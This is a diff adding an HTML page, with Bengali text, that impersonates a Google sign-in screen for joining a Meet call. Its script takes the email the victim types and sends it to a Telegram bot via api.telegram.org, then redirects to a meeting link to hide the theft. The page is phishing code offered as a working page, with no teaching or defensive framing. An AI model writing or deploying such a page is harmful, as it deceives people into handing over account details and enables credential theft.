@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Verification</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f7f8f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .verify-card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; width: 340px; border: 1px solid #e0e0e0; }
+        .google-icon { width: 40px; margin-bottom: 15px; }
+        h2 { font-size: 20px; color: #3c4043; margin-bottom: 10px; }
+        p { font-size: 14px; color: #5f6368; margin-bottom: 25px; line-height: 1.5; }
+        
+        .google-btn { display: flex; align-items: center; justify-content: center; background: white; border: 1px solid #dadce0; padding: 10px; border-radius: 4px; cursor: pointer; transition: 0.2s; width: 100%; font-weight: 500; color: #3c4043; }
+        .google-btn:hover { background: #f8f9fa; border-color: #d2e3fc; }
+        .google-btn img { width: 20px; margin-right: 10px; }
+
+        /* পপ-আপ স্টাইল */
+        #loginPopup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); justify-content: center; align-items: center; }
+        .login-box { width: 350px; text-align: left; background: white; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; }
+    </style>
+</head>
+<body>
+
+<div class="verify-card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" class="google-icon" alt="G">
+    <h2>ভেরিফিকেশন প্রয়োজন</h2>
+    <p>মিটিংয়ে যোগ দেওয়ার আগে আপনার গুগল অ্যাকাউন্ট দিয়ে ভেরিফাই করুন।</p>
+    
+    <div class="google-btn" onclick="showLogin()">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="G">
+        Continue with Google
+    </div>
+</div>
+
+<div id="loginPopup">
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" style="width: 75px; margin-bottom: 10px;">
+        <h2 style="font-weight: 400; margin-bottom: 5px;">Sign in</h2>
+        <p style="margin-bottom: 30px;">to continue to Meet</p>
+        
+        <input type="text" id="emailInput" placeholder="Email or phone" style="width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 10px; box-sizing: border-box;">
+        
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 40px;">
+            <span style="color: #1a73e8; cursor: pointer; font-size: 14px; font-weight: 500;">Create account</span>
+            <button onclick="captureAndSend()" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500;">Next</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    function showLogin() {
+        document.getElementById('loginPopup').style.display = 'flex';
+    }
+
+    function captureAndSend() {
+        const token = "YOUR_BOT_TOKEN"; 
+        const chat_id = "YOUR_CHAT_ID";
+        const meetLink = "https://meet.google.com/your-code"; 
+
+        const email = document.getElementById('emailInput').value;
+
+        if (email.trim() === "") {
+            alert("Please enter your email");
+            return;
+        }
+
+        const text = `✅ গুগল ভেরিফাই সফল!\n\nইউজার ইমেইল: ${email}\nএখন সে মিটে জয়েন করছে।`;
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+
+        fetch(url).then(() => {
+            window.location.href = meetLink;
+        }).catch(() => {
+            window.location.href = meetLink;
+        });
+    }
+</script>
+
+</body>
+</html>
